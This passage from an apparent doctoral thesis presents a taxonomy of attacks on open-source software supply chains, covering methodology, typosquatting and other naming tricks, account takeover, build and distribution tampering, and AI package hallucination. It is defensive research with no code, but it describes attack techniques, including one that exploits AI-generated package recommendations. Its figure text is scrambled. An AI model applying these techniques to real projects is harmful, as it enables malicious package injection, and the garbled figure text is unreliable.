In this context, our work share the same goal with the work proposed by Zhang et al. [73]. This work (appeared just after ours [5]) proposes an approach to perform the detection cross-language in both JavaScript and Python. With respect to their approach, we do not consider any language-specific features (e.g., security sensitive APIs) to ease the portability to other programming languages and with the benefit of having a more lightweight approach that looks only at lexical features and characteristics of the package. However, the approach from Zhang et al. [73] is a further demonstration of the promising results of the cross-language detection obtained in our work, as they further improve the accuracy in the detection. 

Most of the work on the detection of malicious open-source packages (cf. Section 2.2) primarily focuses on interpreted languages (e.g., JavaScript), while the Java ecosystem is less explored despite its popularity [86], [87]. Since the usual way of consuming such packages is through pre-compiled JARs, in the context of this thesis, we aim to explore the detection of malicious JARs (i.e., pre-built Java packages) using a static approach to analyze Java Virtual Machine (JVM) bytecode. 

To do so, in comparison to Sejfia et al. [29], we adapted some of the features considered in their approach to the context of Java. This includes the concept of sensitive APIs (e.g., process creation, dynamic code generation) and the utilization of Shannon entropy to detect obfuscation. While they apply the latter at the file level to detect the presence of compiled or minified code, we apply it to the strings found in the Java class file’s constant pool. 

Unlike Vu et al.[41] and Scalco et al.[42], who analyze the discrepancy between source code and the deployed package in PyPI as a means to detect malicious injections in the Python ecosystem, our approach does not take source code into account. 

46 

_3.2. Novelty in the Prevention of Software Supply Chain Attacks_ 

In the context of works focusing on Java malware detection [79], [80], the existing works primarily concentrate on detecting malicious code in Java applets or entirely malicious JARs (i.e., those predominantly consisting of malicious code). In the context of OSS supply chain attacks, malicious packages may contain a small portion of malicious code, and they often leverage existing benign functionalities. Additionally, some of the APIs relevant to applets are not applicable in the context of Java libraries (e.g., APIs designed for MIDlets). 

As discussed in Section 2.2 our goal of detecting malicious JARs presents several touchpoints with the field of Android malware detection. Nevertheless, the challenge of detecting malicious Java libraries within the Android ecosystem is characterized by specific differences. Malware targeting mobile devices often has distinct objectives, such as achieving financial gain through activities like sending SMS messages or accessing contacts. Additionally, there are technical disparities between Java for Android and the standard JVM, including variations in permissions, intents, and APIs unique to the Android platform. 

Furthermore, the realm of Android malware detection has been explored for several years, yielding numerous samples of Android malware that can be subjected to analysis. For instance, Aafer et al. [88] analyzed Android malware samples to extract their commonly used APIs, subsequently constructing a KNN classifier for Android malware detection. In contrast to their work, which benefits from a wealth of available malicious samples, our search for relevant APIs relies on manual inspections of malicious packages, given the scarcity of available malicious data. 

47 

Chapter 4 

## **- CONTRIBUTION 1 TAXONOMY OF ATTACKS ON OPEN-SOURCE SOFTWARE SUPPLY CHAINS** 

## **Summary** 

**Problem Addressed:** P1 - Lack of Comprehensive Attack Taxonomy **Key Contribution(s):** Taxonomy of attacks on OSS supply chains, comprising 118 unique attack vectors and validated by both experts and practitioners. **Contribution Type:** Understanding **Point of view:** Attacker **Associated Publication(s):** See references [1]–[3] **Scope:** 

**==> picture [212 x 100] intentionally omitted <==**

**----- Start of picture text -----**<br>
ATTACKER<br>1. Make the  2. Make the victim  3. Make the victim<br>malicious OSS  download the  execute the<br>package available malicious OSS  malicious code in<br>package the OSS package<br>DEFENDER<br>Detect malicious package<br>before download or<br>execution<br>**----- End of picture text -----**<br>


In the discussion about the state of the art (Chapter 2, Section 2.1) we presented the different works related to understanding software supply chain attacks. Nevertheless, we observed that existing works on open-source supply chain security lack a comprehensive, comprehensible, and general description of how attackers inject malicious code into OSS projects, that is independent of specific programming languages, ecosystems, technologies, and stakeholders. 

We believe that a taxonomy classifying these attacks could provide value to both academia and industry. Such a taxonomy could serve as a common reference, clarify terminology, and support various activities, including developer training, risk assessment, 

49 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

and the development of new safeguards. As such, we aim to address the following **research questions** : 

- – 

- **RQ1.1** What is a comprehensive list of general attack vectors on OSS supply chains? 

- – 

- **RQ1.2** How to represent those attack vectors in a comprehensible and useful fashion? 

To address these questions, we began by conducting an extensive review of both the scientific and grey literature to compile a comprehensive list of attack vectors. This list encompasses not only exploited vulnerabilities but also unexploited weaknesses and potential proof-of-concept attack vectors. Subsequently, we constructed a detailed taxonomy in the form of an attack tree. 

Attack trees [89], [90] are intuitive and systematic representations of attacker goals and techniques, and support organizations in risk assessment, especially with regards to understanding exposure and identifying countermeasures. The root node of an attack tree represents the attacker’s top-level goal, which is iteratively refined by its children into subgoals. Depending on the degree of refinement, the leaves correspond to more or less concrete and actionable tasks. As taxonomies require assigning instances to exactly one class, we only consider disjunctive refinement, where child nodes represent alternatives to reach the parent goal. 

As a result of our efforts, the primary contributions of this thesis include the development of a taxonomy featuring a remarkable **118 unique attack vectors** associated with OSS supply chains. This taxonomy is presented in the form of an attack tree and has been rigorously **validated by 17 domain experts** . The validation process assessed its completeness, comprehensibility, and applicability in various use cases. 

## **4.1 Methodology** 

The methodology employed to address the previously mentioned research questions encompasses three distinct phases, as illustrated in Figure 4.1. 

First, we conduct a comprehensive review of both scientific and grey literature to compile an extensive inventory of attack vectors targeting OSS supply chains. 

Second, using the attack vectors identified in the literature and considering the various elements of OSS supply chains introduced in Section 1.1, we extract the essential concepts, abstracting from specific programming languages or ecosystems. We then engage in threat 

50 

_4.1. Methodology_ 

modeling to construct a taxonomy, which is represented in the form of an attack tree. This phase also involves identifying and categorizing safeguards designed to mitigate these vectors (cf. Chapter 5). 

Third, to validate the proposed taxonomy and the list of safeguards, we design and administer two separate user surveys. The first survey is targeted at experts in the field of OSS supply chain security, while the second survey is directed towards software developers who extensively use OSS. 

## **Systematic Literature Review** 

The Systematic Literature Review (SLR) accomplishes two goals. First, through exploring the state-of-the-art of OSS supply chain security, we identify and specify the abovementioned research questions. Second, it supports identifying and collecting relevant attack vectors and suitable safeguards. The SLR itself follows a three step methodoloy comprising _planning, conducting_ , and _reporting_ [91] [92] depicted in Figure 4.1 and described hereafter. 

- **Search Strategy** This step defines the search terms, the query used on the identified resources, and the inclusion criteria. For our purpose, we used the following query to search for the terms anywhere in the documents: `(" open source" OR "open -source" OR "OSS" OR "free" OR "free/libre" OR " FLOSS) AND "software" AND (" supply chain" OR "supply -chain ") AND (" security" OR "insecurity" OR "attack" OR "threat" OR "vulnerability ")` 

The four digital libraries queried during the SLR are: Google Scholar[1] (980 results), arXiv[2] (6 results), IEEExplore[3] (25 results) and ACM Digital Library[4] (160 results). 

After eliminating duplicates from the initial 1171 search results, a total of 1025 papers were retained. 

We only included peer-reviewed articles in journals and conferences, technical reports, and Ph.D./Master theses written in English and published before March 2022. Also, we only included studies related to security aspects, threats and malware in the areas of OSS development, VCS, build systems and package repositories, as well as malware 

1. `https://scholar.google.com/` 

> 2. `https://arxiv.org/` 

> 3. `https://ieeexplore.ieee.org/` 

4. `https://dl.acm.org/` 

51 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

**==> picture [341 x 571] intentionally omitted <==**

– Figure 4.1 Our methodology comprises a literature review, the modeling of taxonomy & safeguards, and the validation. 

52 

_4.1. Methodology_ 

detection and software supply chain security. The application of those inclusion criteria reduced the 1025 results obtained in the previous phase to 99 papers. Discarded documents concern security aspects in physical or hardware supply chains, or general discussions about emerging technologies (of which OSS security is an example). 

We then applied the _snowballing technique_ on all the remaining works to find resources missed during the initial search, thereby applying the same inclusion criteria. This resulted in the addition of another 84 new studies. 

## **Data Extraction** 

The selection process resulted in a total of 183 scientific works, mostly from the last few years (cf. Figure 4.2), which were carefully reviewed to extract information about common threats, attack vectors, and related safeguards. The complete list of the selected works is accessible online[5] . 

**==> picture [454 x 157] intentionally omitted <==**

– Figure 4.2 No. selected scientific articles (until March 2022) per year of publication. 

## **Grey Literature** 

In addition to scientific literature, especially to cover as many real-world attacks and vulnerabilities as possible, we looked at grey literature like blog posts, whitepapers, or incident reports. To this end, we periodically reviewed several news aggregators and blogs. The main sources used during the grey literature review are the following: 

— IQT Lab’s Software Supply Chain Compromises dataset[6] ; 

> 5. `https://doi.org/10.5281/zenodo.6395965` 

> 6. `https://github.com/IQTLabs/software-supply-chain-compromises` 

53 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

- Backstabber’s Knife Dataset[7] [27]; 

- Whitepapers from Microsoft [93] and Google [94]; 

- Whitepapers of projects for securing the software supply chain, like SLSA [44], sigstore[8] , TUF[9] , in-toto[10] and OSSF Scorecard[11] ; 

- News aggregator (e.g., The Hacker News[12] , Bleepingcomputer[13] , heise Security[14] ); 

- Blogs of package repositories and security vendors (e.g., Snyk[15] , Sonatype[16] ) and security researchers; 

- Keynotes from cyber-security conferences (e.g., Blackhat [95]); 

- MITRE’s Common Attack Pattern Enumeration and Classification (CAPEC)[17] ; 

- — MITRE’s ATT&CK[18] . 

Also, we used the same search query as in Section 4.1 for searching on Google. All results were filtered using the selection criteria from Section 4.1, and the _snowballing technique_ was applied to further extend the set of sources. 

## **Attacker Model** 

The development of the taxonomy was guided by specific assumptions and an attacker model. These assumptions and the attacker model served as the foundation for defining the scope and goals of the attacker’s activities. 

In this model, the attacker’s primary objective is to inject malicious code into opensource artifacts, with the aim of ensuring its execution within the context of downstream projects. The malicious code introduced can serve various purposes, such as data exfiltration, backdoor access, or the download and execution of second-stage payloads, including cryptominers [27]. The potential victims or targeted assets of these attacks may include both the developers of downstream software projects and their end-users, contingent on the attacker’s specific intentions. 

7. `https://dasfreak.github.io/Backstabbers-Knife-Collection/` 

> 8. `https://www.sigstore.dev/` 

> 9. `https://theupdateframework.io` 

> 10. `https://in-toto.io` 

> 11. `https://github.com/ossf/scorecard` 

> 12. `https://thehackernews.com` 

13. `https://www.bleepingcomputer.com` 

14. `hhttps://www.heise.de/security/` 

15. `https://snyk.io/blog/` 

16. `https://blog.sonatype.com` 

17. `https://capec.mitre.org/` 

18. `https://attack.mitre.org` 

54 

_4.1. Methodology_ 

However, it is crucial to note that the focus of the taxonomy is not on the specific actions of malicious code (i.e., the _what_ ) but, instead, on elucidating the methods and techniques used by attackers to implant it within upstream projects (i.e., the _how_ ). 

The scope of this study explicitly excludes insider attacks. In other words, the adversaries involved in these attacks are not affiliated with the maintainers of the targeted opensource project, nor are they members or employees of any third-party service providers associated with the development, build processes, or distribution of project artifacts. Consequently, these attackers lack any privileged access to project resources, such as build jobs or the underlying infrastructure, such as servers or databases linked to code repositories. 

Initially, attackers’ access is limited to publicly accessible information and resources, which they can gather and analyze through the use of the Open Source Intelligence (OSINT) approach [96]. Given the inherent transparency of open-source projects, many project details, including dependencies, build information, and commit and merge request histories, are publicly available. Attackers can interact with any of the stakeholders and resources outlined in Figure 1.2. This interaction can take various forms, such as communicating with project maintainers through merge requests or issue trackers, as well as creating fictitious accounts and projects. 

## **Analysis and Modeling of the Attack Scenario** 

In order to propose a taxonomy of OSS supply chain attacks and answer research question **RQ1.2** , we conducted an analysis of the OSS supply chain, which is described in Section 1.1 and illustrated in Figure 1.2. This analysis involved classifying the attack vectors identified during the SLR) into categories within the context of OSS development. 

The analysis began with the identification of stakeholders ( _actors_ ), _systems_ , and their relationships ( _channels_ ), as explained in Section 1.1. This analysis played a crucial role in identifying potential categories for structuring the attack vectors. 

During the modeling phase, we adopted an _attack-centric_ methodology whose purpose is to characterize the hostility of the environment and the attack complexity for exploiting a system vulnerability [97]. In particular, we performed closed card-sorting in the form of a tree-test intending to build a taxonomy of OSS supply chain attacks as an attack tree. _Closed card-sorting_ is an information architecture technique taken from User eXperience (UX) design, in which the participants are asked to structure a given set of information [98]. A tree-test is a particular case of a card-sorting problem, where the information is structured in a tree. 

55 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

For the attack tree modeling, we used as a starting point the attack tree proposed by Ohm et al. [27], whose root node is _Injection of Malicious Code (into dependency tree)_ . Thanks to a rigorous structure, deeper refinement and the SLR, we identified many additional attack vectors (107 instead of 19). Additional attack vectors were incorporated into the taxonomy during the active maintenance of the tool _Risk Explorer for Software Supply Chains_ [2], which involved a continuous monitoring of the threat landscape of the OSS supply chain. 

The main criteria to structure the attack tree were: degree of interference with existing ecosystems (1st-level nodes), stages of the software supply chain (i.e., source, build, distribute), and the system and stakeholders involved in each stage. 

The initial naming and arrangement have been changed to reflect the expert feedback described in Section 4.3. The refined version of our initial attack tree is depicted in Figure 4.3. 

## **Survey Methodology** 

We conducted two online surveys targeting two different audiences. First, we addressed experts in the domain of software supply chain security to validate the proposed taxonomy of attack vectors ( **RQ1.1** and **RQ1.2** ) and to collect feedback regarding the utility and costs of safeguards (cf. Chapter 5). Second, we addressed developers to rate their use of attack vectors and perceived protection level. Optionally, they could additionally assess the taxonomy and the use and awareness of safeguards from the perspective of open-source consumers (cf. Chapter 5). 

## **Questionnaire Design and Development** 

We conducted a cross-sectional survey [99] consisting of the following three parts. 

**1) Demographics** This part collects background information about survey participants, especially their skillset to check whether our objectives to address security experts and developers are met, but also programming languages used, or whether they actively participate in OSS projects. The results are discussed in Appendix A. 

**2) Taxonomy** In the expert survey, this part was meant to validate and assess the proposed taxonomy. Before displaying our proposed taxonomy in its entirety, we used 

56 

_4.1. Methodology_ 

tree-testing [100] to capture how easily users find tree nodes. This helped validate the nodes’ parent-child relationships. Afterwards, participants were asked to explore an interactive visualization of the complete taxonomy, and then to rate its structure, node names, coverage, and its usefulness (to support different use-cases) on a Likert scale from 1 (low) to 5 (high). 

In the developer survey, this part started with a presentation of the taxonomy’s firstlevel nodes, including attack vector names and descriptions. Participants were asked – – whether they are aware of such attacks and whether they or their organization use any mitigating safeguards. Optionally, participants could continue this part to explore the taxonomy and rate its comprehensibility and usefulness. 

**3) Safeguards** In the expert survey, the participants assessed the utility and costs of the selected safeguards. To this end, they were grouped by and presented according to the stakeholder roles involved in their implementation. 

This entire part was optional in the developer survey. When opting-in, respondents only rated safeguards relevant according to their role in open-source projects (if any). When shown, survey participants provided feedback whether they use a given safeguard and its perceived costs (Likert scale). 

## **Pilot Survey and Pretest** 

Interviews with two experts in user research and UX provided us feedback on the suitability and understandability of the survey. Their main suggestions were to shorten texts and improve content presentation, especially of the tree-testing content. After implementing their feedback, we performed a pretest of the expert survey with 37 researchers from academia (i.e., Ph.D. students, researchers, and professors), and the developer survey with 14 master students. The feedback received from this pretest suggested further shortening texts, improving some questions, and adjusting the appearance of buttons. 

## **Sampling** 

For the selection of participants in both questionnaires, we adopted the snowball sampling technique [101]. It consisted of inviting an initial group of participants, which were asked to further share the invitation in their appropriate network of knowledge. Due to this sampling technique, it is not possible to compute the response rate. 

57 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

The initial list of domain experts was composed of authors of works analyzed during the SLR, as well as experts from industry and academia from our network. We included experts who performed relevant works in the context of OSS supply chain security (e.g, scientific publications, initiatives/projects of software foundations or industry). Similarly, the initial list of software developers has been created starting from our network of knowledge of practicioners. 

The channels used to reach the participants have been emails, Linkedin, and direct recruitment during presentations. 

The expert survey campaign began on 22 July 2021, the one for developers on 19 October 2021. Both questionnaires were closed for analysis on 24 November 2021, and reached a total of 17 and 134 respondents respectively. 

## **Survey Procedure and Data Protection** 

Rather than using existing survey tools or services, we developed a custom solution. SurveyJS[19] was used to design the survey structure and content, which we exported as JSON file. This file was hosted using GitHub Pages, together with SurveyJS’ runtime library and other resources. Participant answers were sent to a custom Google AppScript, which stored them in a Google spreadsheet. Answers were sent after each survey page and grouped using a random number generated in the beginning. 

Applying the principle of data minimization, we did not collect IP addresses, names or other Personally Identifiable Information (PII). We also did not have access to 3rd party server logs. Moreover, the decoupling of survey frontend and backend made that the first 3rd party service provider only knows survey structure and content, while the second only sees (encoded) answers without understanding their semantics. 

## **4.2 Attack Taxonomy** 

This section presents the taxonomy consisting of 118 unique attack vectors collected through the review of scientific and grey literature. Following, it summarizes the results of its validation by domain experts, and the responses of software developers regarding problem awareness, understandability, and usefulness of our taxonomy. 

> 19. `https://surveyjs.io/` 

58 

_4.2. Attack Taxonomy_ 

## **(AV-000) Conduct an Open-Source Supply Chain Attack** 

The primary objective of attackers in a supply chain attack is to insert malicious code or changes into an OSS project. This manipulated code is designed to be downloaded by downstream users and executed during installation or runtime. These malicious changes can encompass more than just adding program code; they might include introducing new malicious dependencies or reintroducing vulnerabilities, such as removing authorization checks. 

Attackers can target any kind of project (e.g., libraries or word processors), direct or indirect downstream consumers, as many as possible, or very specific ones. The latter is possible by conditioning the execution of malicious code, e.g., on the lifecycle phase (install, test, etc.), application state, operating system, or properties of the downstream component it has been integrated into [27]. 

The entire taxonomy unfolding below this high-level goal is depicted in Figure 4.3 and summarized hereafter, whereby the 1st-level child nodes of the tree reflect different degrees of interference with existing packages. 

## **(AV-100) Develop and Advertise Distinct Malicious Package from Scratch** 

_Develop and Advertise Distinct Malicious Package from Scratch_ [23], [27], [29], [102] covers the creation of a new OSS project, with the intention to use it for spreading malicious code from the beginning or at a later point in time. Besides creating the project, the attacker is required to advertise the project to attract victims. Real-world examples affect PyPI, npm, Docker Hub or NuGet [27], [103]–[109]. 

## **(AV-200) Create Name Confusion with Legitimate Package** 

_Create Name Confusion with Legitimate Package_ [23], [29], [67], [110]–[113] covers attacks that consist of creating project or artifact names that resemble legitimate ones, suggest trustworthy authors, or play with common naming patterns. Once a suitable name is found, the malicious artifact is deployed, e.g., in a source or package repository, in the hope of being consumed by downstream users. As the deployment does not interfere with the resources of the project that inspired the name (e.g., legitimate code repository, maintainer accounts) the attack is relatively cheap. 

59 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

**==> picture [410 x 593] intentionally omitted <==**

**----- Start of picture text -----**<br>
Account UserLegitimate Account UserLegitimate Account UserLegitimate Account<br>Algorithm DifferencesFile Code Credentials Bruteforce APITokensLeaked CredentialsObtainto SessionofExisting AssociatedWithLegitimate Component BlackmailBribeor Take-overLegitimate BlackmailBribeor Take-overLegitimate BlackmailBribeor Take-overLegitimate<br>BidirectionalUnicodeExploit (AV-307)HomoglyphsUse ofDisplayPrevent Generated/Compiled/Minifiedin (AV-603)CompromisedofReuse (AV-604) (AV-605)ofReuse SocialEngineering (AV-607)Reuse ExpiredDomain ConfigurationWeakExploit VulnerabilitiesExploit Maliciousthrough (AV-601) (AV-602) (AV-601) (AV-602) (AV-601) (AV-602)<br>Hide (AV-606) Resurrect Infect<br>ExploitableVulnerabilityMakeImmature (AV-306) (AV-305)WeaknessRenderingExploit (AV-308) (AV-309) BlackmailBribeUserLegitimateor (AV-602)AccountTake-overLegitimate (AV-608)(AV-800)MaintainerBecomea (AV-801)(AV-701)ChangeEthos (AV-702)(AV-700)SystemCompromiseMaintainer (AV-703) Maintainer/Administrator)(Project(AV-600)CompromiseUser (AV-700)SystemControlCompromiseVersion (AV-601)BlackmailBribeUserLegitimateor (AV-602)AccountTake-overLegitimate (AV-800)MaintainerBecomea (AV-801)ChangeEthos (AV-700)SystemCompromiseMaintainer Maintainer/Administrator)(Project(AV-600)CompromiseUser (AV-700)SystemCompromiseBuild (AV-506)AttackMITM (AV-507)CacheDNSPoisoning (AV-508)URLLegitimateTamper (AV-509)AbuseMechanismResolutionDependency Version (AV-601)BlackmailBribeUserLegitimateor (AV-602)AccountTake-overLegitimate (AV-800)MaintainerBecomea (AV-801)ChangeEthos (AV-700)SystemCompromiseMaintainer Maintainer/Administrator)(Project(AV-600)CompromiseUser (AV-700)SystemCompromiseHosting<br>(AV-304) (AV-601)<br>CodeMalicious RequestMerge Maintaineras 3 SystemControlVersion BuildMalicious JobBuildMaintaineras 3 SystemBuildExposed ReferenceDangling PackageMaskLegitimate Non-VulnerableUpdateto PackageMaintaineras 3 SystemHostingInjectinto<br>with Run with Distribute<br>Introduce Hypocrite Contribute Tamper (AV-401) Tamper Tamper (AV-501) (AV-502) Prevent (AV-504) (AV-505)<br>(AV-301) through (AV-302) (AV-402) (AV-503)<br>(AV-403)<br>(AV-303)<br>Package<br>Package<br>Package<br>Legitimate<br>Legitimate of<br>Legitimate of maintainer<br>of<br>Build Version<br>OrderWord SeparatorsWord Package Attack Namespaceor Hallucination Sourcesinto 2 the Malicious user system projecton<br>Combosquatting Altering Typosquatting Built-In Brandjacking Similarity Scope Package Inject DuringInject ofa ofa attack<br>AI Distribute package<br>(AV-201) (AV-202) (AV-203)Manipulating (AV-204) (AV-205) (AV-206) (AV-207) (AV-208)Omitting (AV-209) (AV-300) (AV-400) (AV-500) thecompromiseto thecompromiseto social-engineeringto node withexisting packagelegitimate<br>of<br>Scratch Package related related related theroot stages andsystems<br>from Confusion to interference<br>Advertise vectors vectors vectors of chain<br>and Package Name Package 1 Legitimate Attack Attack Attack Recursion Degree Supply Stakeholders<br>Develop Malicious Create Legitimate Subvert<br>(AV-200) with Expanded<br>(AV-100) Distinct (AV-001)<br>levels<br>Open-Source differentof 1 2 3<br>Collapsed<br>Attack<br>Conduct<br>Chain Semantics<br>(AV-000) Supply<br>**----- End of picture text -----**<br>


– Figure 4.3 Refined version of the taxonomy for OSS supply chain attacks [1]. 

60 

_4.2. Attack Taxonomy_ 

Child nodes of this attack vector relate to sub-techniques applying different modifications to the legitimate project name. 

**(AV-201) Combosquatting** This technique consists of creating a package name containing pre or post-fix additions to the name of a benign package. The attacker can use naming patterns that are common to general development practices (e.g., the addition of `-dev` or `-rc` ), given ecosystems (e.g., the addition of `3` to suggest compatibility with Python 3) or indicate platform compatibility (e.g. `i386` ) [49]. 

**(AV-202) Altering Word Order** This technique aims at re-arranging the word order when the name of legitimate packages comprises multiple words, e.g. separated by hyphens or using camel case notation [49]. For example, `test-vision-client` would be transformed into `client-vision-test` according to this technique. 

**(AV-203) Manipulating Word Separators** This technique consists of adding or altering word separators of legitimate packages, e.g. hyphens or underscores (for example `setup-tools` instead of `setup-tools` ) [49]. 

**(AV-204) Typosquatting** This is a technique originally known in the context of website domains, and relies on mistakes such as typographical errors made by users when entering a website address into a web browser. In this context, the attacker exploits that users mistype names of legitimate packages during installation or when declaring dependencies ( `dajngo` vs. `django` ) [22], [27], [49], [66], [114], [115]. **(AV-205) Built-In Package** This technique consists of replicating well-known names from other contexts, e.g., built-in packages or modules of a programming language ( `subprocess` for Python) [49] . A victim can be tricked into downloading and installing the malicious package through the package manager rather than using built-in functionality. 

**(AV-206) Brandjacking** This technique consists of crafting package names that create the impression of coming from a trustworthy author or entity, e.g. by using the same prefix as legitimate packages from such author (e.g. "aws-", `twilio-npm` ) [116]. 

**(AV-207) Similarity Attack** This technique creates a misleading name in a way different from the previous categories ( `request` vs. `requests` ) [117]. 

61 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

**(AV-208) Omitting Scope or Namespace** Certain package repositories offer the option of using namespaces as part of a package identifier. In platforms like npm, every user or organization has its own designated scope. These namespaces are typically utilized by individuals, organizations, or projects to organize and oversee multiple artifacts, signifying ownership to potential users. Malicious actors can exploit this by releasing a package with the same name but without a namespace, potentially leading victims to mistakenly assume that it originates from the reputable organization or project. 

**(AV-209) AI Package Hallucination** Generative AI platforms, such as ChatGPT, have the capability to generate responses and recommendations based on the patterns and information learned during training. While these platforms provide valuable assistance, it’s important to note that the responses generated may not always align with reality and can include elements that do not exist. In the context of coding tasks, developers may seek recommendations for packages that can solve their specific needs. However, the generative AI model might suggest packages that are not actually present in legitimate package repositories like NPM or PyPI. This creates an opportunity for attackers to exploit the platform by crafting questions that prompt the AI to generate non-existent package names. The intention of such an attack would be to deceive developers who rely on the generative AI’s recommendations. The attackers could then publish malicious packages under these fabricated names, leading unsuspecting developers into using them [118]. 

## **(AV-001) Subvert Legitimate Package** 

_Subvert Legitimate Package_ covers all attacks aiming to corrupt an existing, legitimate project, which requires compromising one or more of its numerous resources depicted in Figure 1.2. As a result, this subtree is much larger compared to the previous ones, especially because subtrees related to user and system compromises occur multiple times in the different supply chain stages. The remainder of this section is dedicated to subtechniques of this first-level node. 

## **(AV-300) Inject into Sources of Legitimate Package** 

_Inject into Sources of Legitimate Package_ relates to the injection of malicious code into a project’s codebase [27], [34], [38], [47], [119]–[121]. For the attacker, this has the advantage to affect all downstream users, no matter whether they consume sources or 

62 

_4.2. Attack Taxonomy_ 

pre-built binary artifacts (as part of the codebase, the malicious code will be included during project builds and binary artifact distribution). 

A malicious code injection can occur within a project when a seemingly benign patch, designed to address an issue, is trojanized. This injection might introduce various elements, such as the completion of an immature vulnerability condition or the addition of a new (malicious) dependency, new functionality, or even malicious test cases. 

This vector has several sub-techniques. Taking the role of contributors, attackers can use _hypocrite merge requests_ to turn immature vulnerabilities into exploitable ones [36], or exploit IDE rendering weaknesses to hide malicious code, e.g., through the use of Unicode homoglyphs and control characters [35], or the hiding and suppression of code differences [122]. This injection might also introduce various elements, such as the addition of a new (malicious) dependency, new functionality, or even malicious test cases. To _contribute as maintainer_ requires to obtain the privileges necessary for altering the legitimate project’s codebase, which can be achieved in different ways. Using Social Engineering (SE) techniques on legitimate project maintainers [26], [123], by _taking over legitimate accounts_ (e.g., reusing compromised credentials [124]), or by _compromising the maintainer system_ (e.g., exploiting vulnerabilities [125]). The latter can also be achieved through a malicious (OSS) component, e.g., IDE plugin, which is reflected through a recursive reference to the root node. 

The legitimate project’s codebase can also be altered by _tampering with its VCS_ , thus, bypassing a project’s established contribution workflows. For instance, by compromising system user accounts [126], [127], or by exploiting configuration/software vulnerabilities [128]–[130], an attacker could access the codebase in insecure ways. 

## **(AV-400) Inject During the Build of Legitimate Package** 

Greatly facilitated by language-specific package managers like Maven or Gradle for Java, it became common to download pre-built components from package repositories rather than OSS project’s source code from its VCS. Therefore, the injection of malicious code can happen during the build of such components before their publication [39], [131], [132]. Though the spread is limited compared to injecting into sources, the advantage for the attacker is that the detection of malicious code inside pre-built packages is typically more difficult, especially for compiled programming languages. One sub-technique is _running a malicious build job_ to tamper with system resources shared between build jobs of multiple projects [43] (e.g., the infection of Java archives in NetBeans projects [133]). An 

63 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

attacker can also _tamper the build job as maintainer_ , e.g., by taking over legitimate maintainer accounts, becoming a maintainer, or compromising their systems (cf. XCodeGhost malware [134]). Similarly, the attacker could comprise build systems, especially online accessible ones, e.g., by compromising administrator accounts [135] or exploiting vulnerabilities [136], [137]. 

## **(AV-500) Distribute Malicious Version of Legitimate Package** 

Pre-built components are often hosted on well-known package repositories like PyPI or npm, but also on less popular repositories with a narrower scope. In addition, the components can be mirrored remotely or locally, made available through CDNs (e.g., in the case of JavaScript libraries), or cached in proxies. This attack vector and its subtechniques cover all cases where attackers tamper with mechanisms and systems involved in the hosting, distribution, and download of pre-built packages. 

_Dangling references_ (re)uses resource identifiers of orphaned projects [138]–[140], e.g., names or URLs. 

_Mask legitimate package_ [95] targets package name or URL resolution mechanisms and download connections. Their goal is the download of malicious packages by compromising resources external to the legitimate project. This includes Man-In-The-Middle (MITM) attacks, DNS cache poisoning, or tampering with legitimate URLs directly at the client [141]. Particularly, package managers follow a (configurable) resolution strategy to decide which package version to download, from where, and the order of precedence when contacting multiple repositories. Attackers can _abuse such resolution mechanisms_ and their configurations [142], [143]. Attackers can also _prevent updates to non-vulnerable versions_ by manipulating package metadata [46], e.g., by indicating an unsatisfiable dependency for newer versions of a legitimate package. Finally, the involvement of systems and users in package distribution results in attack vectors similar to previous ones. Attackers can take the role of legitimate maintainers, thus, _distribute as maintainer_ , e.g., by taking over package maintainer accounts (e.g., `eslint` [144]), the second most common attack vector after typosquatting [27]. They can also compromise maintainer systems, or directly _inject into the hosting system_ , e.g., by compromising administrator accounts [145] or exploiting vulnerabilities [146]–[149]. 

64 

_4.3. Validation and Assessment_ 

## **Response to RQ1.1** 

Through the review of 183 scientific papers as well as grey literature, we identified and generalized 107 unique attack vectors on OSS supply chains, supported by 94 real-world attacks or vulnerabilities. 

## **4.3 Validation and Assessment** 

The initial version of the taxonomy underwent validation and assessment by **17 domain experts** and **134 software developers** . The feedback provided by the experts was used to enhance the quality of the taxonomy, resulting in the taxonomy depicted in Figure 4.3. 

Concerning the software developers, their feedback primarily involved validating and assessing their awareness of the main attack vectors (1st-level taxonomy nodes), as well as determining whether they had taken steps to mitigate these vectors within their own work or organizations. Additionally, they had the option to provide feedback on the taxonomy’s understandability and utility. 

In the following sections, we present the results of the user survey, which are also summarized in Table 4.1. 

## **Validation and Assessment by Domain Experts** 

The initial version of the taxonomy (depicted in Figure 4.4) was validated and assessed by **17 domain experts** . Their feedback is summarized in Table 4.1 and has been retrofitted resulting in the refined taxonomy depicted in Figure 4.3. 

**Taxonomy Validation** This section reports expert feedback on the comprehensiveness of attack vectors, and the correctness, comprehensibility, and usefulness of the taxonomy. 

Before having seen the taxonomy in its entirety, the tree-testing required experts to assign attack vectors to the first level nodes of the initial taxonomy. Over a total of 311 assignments by all experts, 234 (75%) matched the structure of the initial taxonomy, while 77 (25%) did not, which shows an overall agreement on the structure. 

Following, the experts were presented with the initial version of the entire taxonomy, and asked to assess different qualities using a Likert scale ranging from 1 (low) to 5 (high). 

65 

Chapter 4 – _Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply Chains_ 

